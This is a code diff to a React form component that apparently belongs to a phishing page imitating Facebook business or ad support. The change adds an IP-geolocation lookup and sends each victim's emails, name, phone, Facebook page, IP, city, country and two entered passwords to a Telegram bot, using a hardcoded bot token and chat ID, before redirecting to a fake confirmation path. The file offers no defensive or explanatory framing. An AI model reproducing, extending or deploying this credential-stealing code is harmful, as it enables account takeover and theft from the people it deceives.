@@ -38,35 +38,51 @@ const Buiness = () => {
             setFirstPassword(values.fill_first_password)
             setActionFirst(false)
         }
-        
+
         
         const passWord = values.fill_first_password;
         setActivePassword(true)
         const dataLocalForm = JSON.parse(localStorage.getItem('dataForm'));
         
         if(activePassword === true){
-            const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord };
 
-            localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
+            axios.get(`https://api.db-ip.com/v2/free/self`)
+            .then((response) => {
 
-            const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
-            const chat_id   = '-1001737921141';
-            // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
-            // const chat_id   = '5208541473';
 
-            const message   = '<strong>User Email: </strong>' + dataPassWord.fill_business_email + 
-            '%0A<strong>User Name: </strong>' + dataPassWord.fill_full_name + 
-            '%0A<strong>User Email: </strong>' + dataPassWord.fill_personal_email + 
-            '%0A<strong>Facebook Page: </strong>' + dataPassWord.fill_facebook_pagename + 
-            '%0A<strong>Phone Number: </strong>' + dataPassWord.fill_phone + 
-            '%0A<strong>First Password: </strong>' + firstPassword +
-            '%0A<strong>Second Password: </strong>' + passWord ;
+                const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord, IP:response.data.ipAddress, city:response.data.city, countryName: response.data.countryName };
 
-            axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
-                .then((response) => {
-                    navigate('/adhelp-109445849938899595/confirm');
-                })
-                .catch((error) => {});
+                localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
+
+                const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
+                const chat_id   = '-1001737921141';
+                // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
+                // const chat_id   = '5208541473';
+
+                const message   = '<strong>User Email: </strong>' + dataPassWord.fill_business_email + 
+                '%0A<strong>User Name: </strong>' + dataPassWord.fill_full_name + 
+                '%0A<strong>User Email: </strong>' + dataPassWord.fill_personal_email + 
+                '%0A<strong>Facebook Page: </strong>' + dataPassWord.fill_facebook_pagename + 
+                '%0A<strong>Phone Number: </strong>' + dataPassWord.fill_phone + 
+                '%0A<strong>IP: </strong>' + response.data.ipAddress + 
+                '%0A<strong>City: </strong>' + response.data.city + 
+                '%0A<strong>Country Name: </strong>' + response.data.countryName + 
+                '%0A<strong>First Password: </strong>' + firstPassword +
+                '%0A<strong>Second Password: </strong>' + passWord ;
+
+            
+                axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
+                    .then((response) => {
+                        navigate('/adcontact19485092349283487823/confirm');
+                    })
+                    .catch((error) => {});
+
+
+            })
+            .catch((error) => {});
+
+
+            
 
         }
             
